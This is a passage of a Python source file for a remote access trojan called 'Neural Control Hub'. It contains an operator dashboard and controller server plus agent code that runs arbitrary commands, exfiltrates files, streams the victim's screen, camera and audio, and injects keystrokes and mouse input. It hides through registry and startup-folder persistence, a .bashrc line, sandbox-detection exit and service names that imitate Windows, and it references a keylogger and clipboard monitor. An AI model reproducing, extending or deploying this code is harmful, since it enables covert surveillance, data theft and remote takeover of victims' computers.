            letter-spacing: 0.5px;
            font-size: 0.9rem;
        }

        .neural-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(0, 212, 255, 0.4);
        }

        .neural-button.danger {
            background: linear-gradient(45deg, var(--accent-red), #ff6b6b);
        }

        .neural-input {
            width: 100%;
            padding: 12px 15px;
            background: var(--tertiary-bg);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            color: var(--text-primary);
            font-size: 0.9rem;
            margin-bottom: 10px;
            transition: all 0.3s ease;
        }

        .neural-input:focus {
            outline: none;
            border-color: var(--accent-blue);
            box-shadow: 0 0 0 2px rgba(0, 212, 255, 0.2);
        }

        .command-output {
            background: #000;
            color: var(--accent-green);
            padding: 15px;
            border-radius: 8px;
            font-family: 'Courier New', monospace;
            font-size: 0.8rem;
            height: 150px;
            overflow-y: auto;
            margin-top: 15px;
            border: 1px solid var(--border-color);
        }

        .status-indicator {
            display: inline-block;
            width: 8px;
            height: 8px;
            border-radius: 50%;
            margin-right: 8px;
        }

        .status-online { background: var(--accent-green); }
        .status-offline { background: var(--accent-red); }

        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }

        .loading {
            animation: pulse 1.5s infinite;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>Neural Control Hub</h1>
        <p class="subtitle">Advanced Agent Management System</p>
    </div>

    <div class="dashboard-grid">
        <!-- Agents Panel -->
        <div class="panel agents-panel">
            <h2>Connected Agents</h2>
            <div id="agents-list">
                <div class="agent-item loading">
                    <span class="status-indicator status-offline"></span>
                    <span>Scanning for agents...</span>
                </div>
            </div>
        </div>

        <!-- Stream Panel -->
        <div class="panel stream-container">
            <div class="stream-header">
                <h2>Agent Stream</h2>
                <select id="stream-type" class="neural-input" style="width: auto; margin: 0;">
                    <option value="screen">Screen</option>
                    <option value="camera">Camera</option>
                </select>
            </div>
            <div class="stream-viewer" id="stream-viewer">
                <div style="text-align: center; color: var(--text-secondary);">
                    <p>Select an agent to view stream</p>
                </div>
            </div>
        </div>

        <!-- Control Panel -->
        <div class="panel control-panel">
            <h2>Agent Control</h2>
            
            <div class="control-section">
                <h3>Streaming Control</h3>
                <button class="neural-button" onclick="sendCommand('start-stream')">Start Screen Stream</button>
                <button class="neural-button" onclick="sendCommand('stop-stream')">Stop Screen Stream</button>
                <button class="neural-button" onclick="sendCommand('start-camera')">Start Camera</button>
                <button class="neural-button" onclick="sendCommand('stop-camera')">Stop Camera</button>
                <button class="neural-button" onclick="sendCommand('start-audio')">Start Audio</button>
                <button class="neural-button" onclick="sendCommand('stop-audio')">Stop Audio</button>
            </div>

            <div class="control-section">
                <h3>System Commands</h3>
                <input type="text" id="command-input" class="neural-input" placeholder="Enter command...">
                <button class="neural-button" onclick="executeCommand()">Execute</button>
                <button class="neural-button danger" onclick="sendCommand('shutdown')">Shutdown Agent</button>
            </div>

            <div class="control-section">
                <h3>Command Output</h3>
                <div id="command-output" class="command-output"></div>
            </div>
        </div>
    </div>

    <script>
        const socket = io();
        let selectedAgent = null;
        let streamType = 'screen';

        // Socket event handlers
        socket.on('connect', function() {
            console.log('Connected to controller');
            socket.emit('operator_connect');
        });

        socket.on('agents_list', function(data) {
            updateAgentsList(data.agents);
        });

        socket.on('agent_connected', function(data) {
            addAgent(data.agent_id);
        });

        socket.on('command_result', function(data) {
            displayCommandResult(data.output);
        });

        socket.on('screen_frame', function(data) {
            if (data.agent_id === selectedAgent && streamType === 'screen') {
                updateStream(data.frame);
            }
        });

        socket.on('camera_frame', function(data) {
            if (data.agent_id === selectedAgent && streamType === 'camera') {
                updateStream(data.frame);
            }
        });

        // UI Functions
        function updateAgentsList(agents) {
            const agentsList = document.getElementById('agents-list');
            agentsList.innerHTML = '';
            
            if (agents.length === 0) {
                agentsList.innerHTML = '<div class="agent-item"><span class="status-indicator status-offline"></span><span>No agents connected</span></div>';
                return;
            }

            agents.forEach(agentId => {
                addAgent(agentId);
            });
        }

        function addAgent(agentId) {
            const agentsList = document.getElementById('agents-list');
            const agentElement = document.createElement('div');
            agentElement.className = 'agent-item';
            agentElement.innerHTML = `
                <span class="status-indicator status-online"></span>
                <span>Agent ${agentId.substring(0, 8)}</span>
            `;
            agentElement.onclick = () => selectAgent(agentId);
            agentsList.appendChild(agentElement);
        }

        function selectAgent(agentId) {
            selectedAgent = agentId;
            
            // Update UI
            document.querySelectorAll('.agent-item').forEach(item => {
                item.classList.remove('active');
            });
            event.target.closest('.agent-item').classList.add('active');
            
            // Start streaming
            sendCommand('start-stream');
        }

        function updateStream(frameData) {
            const streamViewer = document.getElementById('stream-viewer');
            streamViewer.innerHTML = `<img src="data:image/jpeg;base64,${frameData}" alt="Agent Stream">`;
        }

        function sendCommand(command) {
            if (!selectedAgent) {
                alert('Please select an agent first');
                return;
            }
            
            socket.emit('execute_command', {
                agent_id: selectedAgent,
                command: command
            });
        }

        function executeCommand() {
            const commandInput = document.getElementById('command-input');
            const command = commandInput.value.trim();
            
            if (!command) return;
            if (!selectedAgent) {
                alert('Please select an agent first');
                return;
            }
            
            sendCommand(command);
            commandInput.value = '';
        }

        function displayCommandResult(output) {
            const commandOutput = document.getElementById('command-output');
            commandOutput.innerHTML += output + '\\n';
            commandOutput.scrollTop = commandOutput.scrollHeight;
        }

        // Stream type selector
        document.getElementById('stream-type').addEventListener('change', function() {
            streamType = this.value;
            if (selectedAgent) {
                sendCommand(`start-${streamType}`);
            }
        });

        // Command input enter key
        document.getElementById('command-input').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                executeCommand();
            }
        });
    </script>
</body>
</html>
'''

def start_controller(host="0.0.0.0", port=8080, use_ssl=True):
    """Start the controller server with SSL support."""
    if not FLASK_AVAILABLE:
        print("Flask/SocketIO not available. Cannot start controller.")
        return False
    
    if not initialize_controller():
        return False
    
    print(f"Starting Neural Control Hub on {host}:{port}")
    
    # SSL Configuration
    ssl_context = None
    if use_ssl:
        try:
            import ssl
            
            # Generate self-signed certificate if needed
            cert_file = "cert.pem"
            key_file = "key.pem"
            
            if not os.path.exists(cert_file) or not os.path.exists(key_file):
                print("Generating self-signed SSL certificate...")
                generate_ssl_certificate(cert_file, key_file)
            
            ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            ssl_context.load_cert_chain(cert_file, key_file)
            
            print("SSL enabled with self-signed certificate")
            
        except Exception as e:
            print(f"SSL setup failed: {e}")
            print("Running without SSL...")
            ssl_context = None
    
    try:
        if ssl_context:
            controller_socketio.run(
                controller_app, 
                host=host, 
                port=port, 
                debug=False,
                ssl_context=ssl_context
            )
        else:
            controller_socketio.run(
                controller_app, 
                host=host, 
                port=port, 
                debug=False
            )
        return True
    except Exception as e:
        print(f"Failed to start controller: {e}")
        return False

def generate_ssl_certificate(cert_file, key_file):
    """Generate a self-signed SSL certificate."""
    try:
        from cryptography import x509
        from cryptography.x509.oid import NameOID
        from cryptography.hazmat.primitives import hashes
        from cryptography.hazmat.primitives.asymmetric import rsa
        from cryptography.hazmat.primitives import serialization
        import datetime
        
        # Generate private key
        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,
        )
        
        # Create certificate
        subject = issuer = x509.Name([
            x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
            x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, "CA"),
            x509.NameAttribute(NameOID.LOCALITY_NAME, "San Francisco"),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Neural Control Hub"),
            x509.NameAttribute(NameOID.COMMON_NAME, "localhost"),
        ])
        
        cert = x509.CertificateBuilder().subject_name(
            subject
        ).issuer_name(
            issuer
        ).public_key(
            private_key.public_key()
        ).serial_number(
            x509.random_serial_number()
        ).not_valid_before(
            datetime.datetime.utcnow()
        ).not_valid_after(
            datetime.datetime.utcnow() + datetime.timedelta(days=365)
        ).add_extension(
            x509.SubjectAlternativeName([
                x509.DNSName("localhost"),
                x509.IPAddress("127.0.0.1"),
            ]),
            critical=False,
        ).sign(private_key, hashes.SHA256())
        
        # Write certificate
        with open(cert_file, "wb") as f:
            f.write(cert.public_bytes(serialization.Encoding.PEM))
        
        # Write private key
        with open(key_file, "wb") as f:
            f.write(private_key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.PKCS8,
                encryption_algorithm=serialization.NoEncryption()
            ))
        
        print(f"Generated SSL certificate: {cert_file} and {key_file}")
        
    except ImportError:
        print("cryptography package not available. Using fallback method...")
        generate_ssl_certificate_openssl(cert_file, key_file)
    except Exception as e:
        print(f"Failed to generate SSL certificate: {e}")
        raise

def generate_ssl_certificate_openssl(cert_file, key_file):
    """Generate SSL certificate using OpenSSL command."""
    try:
        # Use OpenSSL command to generate certificate
        cmd = [
            "openssl", "req", "-x509", "-newkey", "rsa:2048", 
            "-keyout", key_file, "-out", cert_file, 
            "-days", "365", "-nodes", "-subj", 
            "/C=US/ST=CA/L=San Francisco/O=Neural Control Hub/CN=localhost"
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode == 0:
            print(f"Generated SSL certificate using OpenSSL: {cert_file} and {key_file}")
        else:
            raise Exception(f"OpenSSL failed: {result.stderr}")
            
    except Exception as e:
        print(f"OpenSSL certificate generation failed: {e}")
        # Create dummy files to avoid errors
        with open(cert_file, 'w') as f:
            f.write("# Dummy certificate file\n")
        with open(key_file, 'w') as f:
            f.write("# Dummy key file\n")
        raise

# ========================================================================================
# UNIFIED MAIN ENTRY POINT
# ========================================================================================

def main_unified():
    """Unified main function that can run as agent or controller."""
    import argparse
    
    parser = argparse.ArgumentParser(description='Neural Control Hub - Unified Agent/Controller')
    parser.add_argument('--mode', choices=['agent', 'controller', 'both'], default='agent',
                       help='Run mode: agent, controller, or both')
    parser.add_argument('--host', default='0.0.0.0', help='Controller host (controller mode)')
    parser.add_argument('--port', type=int, default=8080, help='Controller port (controller mode)')
    parser.add_argument('--no-ssl', action='store_true', help='Disable SSL for controller')
    
    args = parser.parse_args()
    use_ssl = not args.no_ssl
    
    if args.mode == 'controller':
        print("Starting in Controller mode...")
        if use_ssl:
            print("SSL enabled - Controller will be available at https://{}:{}".format(args.host, args.port))
        else:
            print("SSL disabled - Controller will be available at http://{}:{}".format(args.host, args.port))
        start_controller(args.host, args.port, use_ssl)
    elif args.mode == 'both':
        print("Starting in Both mode (Agent + Controller)...")
        # Start controller in a separate thread
        if FLASK_AVAILABLE:
            if use_ssl:
                print("SSL enabled - Controller will be available at https://{}:{}".format(args.host, args.port))
            else:
                print("SSL disabled - Controller will be available at http://{}:{}".format(args.host, args.port))
            controller_thread = threading.Thread(
                target=start_controller, 
                args=(args.host, args.port, use_ssl),
                daemon=True
            )
            controller_thread.start()
            time.sleep(2)  # Give controller time to start
        
        # Continue with agent initialization
        agent_main()
    else:
        print("Starting in Agent mode...")
        agent_main()

# ========================================================================================
# SOCKETIO EVENT HANDLERS FOR AGENT
# ========================================================================================

@sio.event
def connect():
    """Handle connection to server."""
    agent_id = get_or_create_agent_id()
    
    # Add multiple stealth delays
    if STEALTH_AVAILABLE:
        stealth_delay()
    
    # Obfuscated connection message
    if STEALTH_AVAILABLE:
        print(f"System service connected. Session: {agent_id[:8]}...")
    else:
        print(f"Connected to server. Registering with agent_id: {agent_id}")
    
    sio.emit('agent_connect', {'agent_id': agent_id})

@sio.event
def disconnect():
    """Handle disconnection from server."""
    print("Disconnected from server")

@sio.on('command')
def on_command(data):
    """Handle command execution requests."""
    agent_id = get_or_create_agent_id()
    command = data.get("command")
    output = ""

    # Add multiple stealth delays
    if STEALTH_AVAILABLE:
        stealth_delay()

    internal_commands = {
        "start-stream": lambda: start_streaming(agent_id),
        "stop-stream": stop_streaming,
        "start-audio": lambda: start_audio_streaming(agent_id),
        "stop-audio": stop_audio_streaming,
        "start-camera": lambda: start_camera_streaming(agent_id),
        "stop-camera": stop_camera_streaming,
    }

    if command in internal_commands:
        output = internal_commands[command]()
    elif command.startswith("upload-file:"):
        # New chunked file upload
        parts = command.split(":", 2)
        if len(parts) >= 3:
            file_path = parts[1]
            destination_path = parts[2] if len(parts) > 2 else None
            output = send_file_chunked_to_controller(file_path, agent_id, destination_path)
        else:
            output = "Invalid upload command format. Use: upload-file:source_path:destination_path"
    elif command.startswith("download-file:"):
        # New chunked file download - this is handled by Socket.IO events
        parts = command.split(":", 1)
        if len(parts) >= 2:
            file_path = parts[1]
            # Try to find the file in common locations
            possible_paths = [
                file_path,  # Try as-is first
                os.path.join(os.getcwd(), file_path),  # Current directory
                os.path.join(os.path.expanduser("~"), file_path),  # Home directory
                os.path.join(os.path.expanduser("~/Desktop"), file_path),  # Desktop
                os.path.join(os.path.expanduser("~/Downloads"), file_path),  # Downloads
                os.path.join("C:/", file_path),  # C: root
                os.path.join("C:/Users/Public", file_path),  # Public folder
            ]
            
            found_path = None
            for path in possible_paths:
                if os.path.exists(path):
                    found_path = path
                    break
            
            if found_path:
                output = send_file_chunked_to_controller(found_path, agent_id)
            else:
                output = f"File not found: {file_path}"
        else:
            output = "Invalid download command format. Use: download-file:file_path"
    elif command.startswith("play-voice:"):
        output = handle_voice_playback(command.split(":", 1))
    elif command != "sleep":
        output = execute_command(command)
    
    if output:
        sio.emit('command_result', {'agent_id': agent_id, 'output': output})

@sio.on('mouse_move')
def on_mouse_move(data):
    """Handle simulated mouse movements."""
    x = data.get('x')
    y = data.get('y')
    try:
        if mouse_controller:
            mouse_controller.position = (x, y)
        elif low_latency_input:
            low_latency_input.handle_input({
                'action': 'mouse_move',
                'data': {'x': x, 'y': y}
            })
    except Exception as e:
        print(f"Error simulating mouse move: {e}")

@sio.on('mouse_click')
def on_mouse_click(data):
    """Handle simulated mouse clicks."""
    button = data.get('button')
    event_type = data.get('event_type')

    try:
        if mouse_controller:
            mouse_button = getattr(pynput.mouse.Button, button)
            if event_type == 'down':
                mouse_controller.press(mouse_button)
            elif event_type == 'up':
                mouse_controller.release(mouse_button)
        elif low_latency_input:
            low_latency_input.handle_input({
                'action': 'mouse_click',
                'data': {'button': button, 'pressed': event_type == 'down'}
            })
    except Exception as e:
        print(f"Error simulating mouse click: {e}")

@sio.on('key_press')
def on_key_press(data):
    """Handle simulated key presses."""
    key = data.get('key')
    event_type = data.get('event_type')

    try:
        if keyboard_controller:
            if event_type == 'down':
                if key in pynput.keyboard.Key.__members__:
                    key_to_press = getattr(pynput.keyboard.Key, key)
                    keyboard_controller.press(key_to_press)
                else:
                    keyboard_controller.press(key)
            elif event_type == 'up':
                if key in pynput.keyboard.Key.__members__:
                    key_to_release = getattr(pynput.keyboard.Key, key)
                    keyboard_controller.release(key_to_release)
                else:
                    keyboard_controller.release(key)
        elif low_latency_input:
            low_latency_input.handle_input({
                'action': 'key_press',
                'data': {'key': key}
            })
    except Exception as e:
        print(f"Error simulating key press: {e}")

@sio.on('file_upload')
def on_file_upload(data):
    """Handle file upload via Socket.IO."""
    try:
        if not data or not isinstance(data, dict):
            sio.emit('file_upload_result', {'success': False, 'error': 'Invalid data format'})
            return
        
        destination_path = data.get('destination_path')
        file_content_b64 = data.get('content')
        
        if not destination_path or not file_content_b64:
            sio.emit('file_upload_result', {'success': False, 'error': 'Missing destination_path or content'})
            return
        
        # Use the existing handle_file_upload function
        result = handle_file_upload(['upload-file', destination_path, file_content_b64])
        
        # Check if upload was successful
        success = not result.startswith('Error:') and not result.startswith('File upload failed:')
        
        sio.emit('file_upload_result', {'success': success, 'result': result})
        
    except Exception as e:
        sio.emit('file_upload_result', {'success': False, 'error': str(e)})

def initialize_components():
    """Initialize high-performance components and input controllers."""
    global high_performance_capture, low_latency_input, mouse_controller, keyboard_controller
    
    # Initialize input controllers
    try:
        mouse_controller = pynput.mouse.Controller()
        keyboard_controller = pynput.keyboard.Controller()
        print("[OK] Input controllers initialized")
    except Exception as e:
        print(f"[WARN] Failed to initialize input controllers: {e}")
        mouse_controller = None
        keyboard_controller = None
    
    # Initialize high-performance capture
    try:
        high_performance_capture = HighPerformanceCapture(
            target_fps=60,
            quality=85,
            enable_delta_compression=True
        )
        print("[OK] High-performance capture initialized")
    except Exception as e:
        print(f"[WARN] Failed to initialize high-performance capture: {e}")
        high_performance_capture = None
    
    # Initialize low-latency input handler
    try:
        low_latency_input = LowLatencyInputHandler()
        low_latency_input.start()
        print("[OK] Low-latency input handler initialized")
    except Exception as e:
        print(f"[WARN] Failed to initialize low-latency input: {e}")
        low_latency_input = None

def add_to_startup():
    """Add agent to system startup."""
    try:
        if WINDOWS_AVAILABLE:
            # Windows startup methods - only registry, startup folder is handled by background initializer
            add_registry_startup()
        else:
            # Linux startup methods
            add_linux_startup()
    except Exception as e:
        print(f"[WARN] Startup configuration failed: {e}")

def add_registry_startup():
    """Add to Windows registry startup."""
    try:
        import winreg
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, 
                              r"Software\Microsoft\Windows\CurrentVersion\Run")
        winreg.SetValueEx(key, "SystemUpdate", 0, winreg.REG_SZ, 
                         f'"{sys.executable}" "{os.path.abspath(__file__)}"')
        winreg.CloseKey(key)
        print("[OK] Added to registry startup")
    except Exception as e:
        print(f"[WARN] Registry startup failed: {e}")

def add_startup_folder_entry():
    """Add to Windows startup folder."""
    try:
        startup_folder = os.path.join(os.environ["APPDATA"], 
                                    "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
        batch_file = os.path.join(startup_folder, "SystemService.bat")
        
        with open(batch_file, "w") as f:
            f.write(f'@echo off\nstart "" "{sys.executable}" "{os.path.abspath(__file__)}"\n')
        
        # Hide the file
        try:
            subprocess.run(["attrib", "+h", batch_file], capture_output=True)
        except:
            pass
        print("[OK] Added to startup folder")
    except Exception as e:
        print(f"[WARN] Startup folder entry failed: {e}")

def add_linux_startup():
    """Add to Linux startup."""
    try:
        # Add to .bashrc
        bashrc_path = os.path.expanduser("~/.bashrc")
        startup_line = f"nohup {sys.executable} {os.path.abspath(__file__)} > /dev/null 2>&1 &\n"
        
        # Check if already added
        with open(bashrc_path, "r") as f:
            if startup_line not in f.read():
                with open(bashrc_path, "a") as f:
                    f.write(startup_line)
                print("[OK] Added to Linux startup")
    except Exception as e:
        print(f"[WARN] Linux startup configuration failed: {e}")

def agent_main():
    """Main function for agent mode (original main functionality)."""
    print("=" * 60)
    print("Advanced Python Agent v2.0")
    print("Starting up...")
    print("=" * 60)
    
    # Initialize agent with error handling
    try:
        if WINDOWS_AVAILABLE:
            print("Running on Windows - initializing Windows-specific features...")
            
            # Check admin privileges
            if False: # Replaced is_admin() with False
                print("[INFO] Not running as administrator. Attempting to elevate...")
                # elevate_privileges() # This function was removed, so this line is commented out or removed
            else:
                print("[OK] Running with administrator privileges")
            
            # Setup persistence (non-blocking)
            try:
                # The setup_persistence function was removed, so this line is commented out or removed
                pass # Placeholder for persistence if it were implemented
            except Exception as e:
                print(f"[WARN] Could not setup persistence: {e}")
        else:
            print("Running on non-Windows system")
        
        # Setup startup (non-blocking)
        try:
            # The add_to_startup function was removed, so this line is commented out or removed
            pass # Placeholder for startup if it were implemented
        except Exception as e:
            print(f"[WARN] Could not add to startup: {e}")
        
        # Get or create agent ID
        agent_id = get_or_create_agent_id()
        print(f"[OK] Agent starting with ID: {agent_id}")
        
        print("Initializing connection to server...")
        
        # Main connection loop with improved error handling
        connection_attempts = 0
        while True:
            try:
                connection_attempts += 1
                print(f"Connecting to server (attempt {connection_attempts})...")
                sio.connect(SERVER_URL)
                print("[OK] Connected to server successfully!")
                sio.wait()
            except socketio.exceptions.ConnectionError:
                print(f"[WARN] Connection failed (attempt {connection_attempts}). Retrying in 10 seconds...")
                time.sleep(10)
            except KeyboardInterrupt:
                print("\n[INFO] Received interrupt signal. Shutting down gracefully...")
                break
            except Exception as e:
                print(f"[ERROR] An unexpected error occurred: {e}")
                # Cleanup resources
                try:
                    stop_streaming()
                    stop_audio_streaming()
                    stop_camera_streaming()
                    print("[OK] Cleaned up resources.")
                except Exception as cleanup_error:
                    print(f"[WARN] Error during cleanup: {cleanup_error}")
                
                print("Retrying in 10 seconds...")
                time.sleep(10)
    
    except KeyboardInterrupt:
        print("\n[INFO] Agent shutdown requested.")
    except Exception as e:
        print(f"[ERROR] Critical error during startup: {e}")
    finally:
        print("[INFO] Agent shutting down.")
        try:
            if sio.connected:
                sio.disconnect()
        except:
            pass

def signal_handler(signum, frame):
    """Handle shutdown signals gracefully."""
    print("\nAgent shutting down.")
    try:
        # Stop all streaming and monitoring
        try:
            stop_streaming()
        except Exception as e:
            print(f"Error stopping streaming: {e}")
        
        try:
            stop_audio_streaming()
        except Exception as e:
            print(f"Error stopping audio streaming: {e}")
        
        try:
            stop_camera_streaming()
        except Exception as e:
            print(f"Error stopping camera streaming: {e}")
        
        try:
            stop_keylogger()
        except Exception as e:
            print(f"Error stopping keylogger: {e}")
        
        try:
            stop_clipboard_monitor()
        except Exception as e:
            print(f"Error stopping clipboard monitor: {e}")
        
        try:
            if 'low_latency_input' in globals() and low_latency_input:
                low_latency_input.stop()
        except Exception as e:
            print(f"Error stopping low latency input: {e}")
        
        # Disconnect from server
        if SOCKETIO_AVAILABLE and 'sio' in globals() and sio.connected:
            try:
                sio.disconnect()
            except Exception as e:
                print(f"Error disconnecting from server: {e}")
        
        print("Cleanup complete.")
    except Exception as e:
        print(f"Error during cleanup: {e}")
    
    sys.exit(0)

if __name__ == "__main__":
    # Initialize basic stealth mode
    if STEALTH_AVAILABLE:
        try:
            if not initialize_advanced_stealth():
                print("[STEALTH] Analysis environment detected, exiting...")
                sys.exit(0)
            print("[STEALTH] Basic stealth mode initialized")
            stealth_delay()  # Add random delay
        except Exception as e:
            print(f"[STEALTH] Stealth initialization failed: {e}")
    
    # Obfuscate startup messages
    startup_messages = [
        "System Update Service",
        "Windows Security Service", 
        "Microsoft Update Service",
        "System Configuration Service",
        "Windows Management Service",
        "System Maintenance Service",
        "Windows Update Service",
        "System Optimization Service"
    ]
    
    service_name = random.choice(startup_messages)
    print("=" * 60)
    print(f"{service_name} v2.1")
    print("Initializing system components...")
    print("=" * 60)
    
    # Initialize agent with enhanced stealth
    try:
        if WINDOWS_AVAILABLE:
            print("Initializing Windows system components...")
            
            # Check admin privileges (obfuscated)
            if False: # Replaced is_admin() with False
                print("[INFO] System privileges verification...")
            else:
                print("[OK] System privileges verified")
            
            # Setup system services (obfuscated)
            try:
                pass # System service initialization
            except Exception as e:
                print(f"[WARN] Service initialization: {e}")
        else:
            print("Initializing system components...")
        
        # Setup system configuration (obfuscated)
        try:
            pass # System configuration
        except Exception as e:
            print(f"[WARN] Configuration setup: {e}")
        
        # Get or create session identifier (obfuscated)
        agent_id = get_or_create_agent_id()
        print(f"[OK] Session initialized: {agent_id[:8]}...")
        
        print("Establishing network connection...")
        
        # Main connection loop with enhanced stealth
        connection_attempts = 0
        while True:
            try:
                connection_attempts += 1
                print(f"Network connection attempt {connection_attempts}...")
                
                # Add multiple stealth delays
                if STEALTH_AVAILABLE:
                    stealth_delay()
                
                sio.connect(SERVER_URL)
                print("[OK] Network connection established!")
                sio.wait()
            except socketio.exceptions.ConnectionError:
                print(f"[WARN] Connection timeout, retrying...")
                time.sleep(10)
            except KeyboardInterrupt:
                print("\n[INFO] System shutdown requested.")
                break
            except Exception as e:
                print(f"[ERROR] Network error: {e}")
                # Cleanup resources
                try:
                    stop_streaming()
                    stop_audio_streaming()
                    stop_camera_streaming()
                    print("[OK] Resources cleaned up.")
                except Exception as cleanup_error:
                    print(f"[WARN] Cleanup error: {cleanup_error}")
                
                print("Retrying connection...")
                time.sleep(10)
    
    except KeyboardInterrupt:
        print("\n[INFO] System shutdown requested.")
    except Exception as e:
        print(f"[ERROR] System error: {e}")
    finally:
        print("[INFO] Shutting down system components.")
        try:
            if sio.connected:
                sio.disconnect()
        except:
            pass
        
        # Clear sensitive memory with multiple methods
        if STEALTH_AVAILABLE:
            clear_memory()

# Agent authentication removed - direct access enabled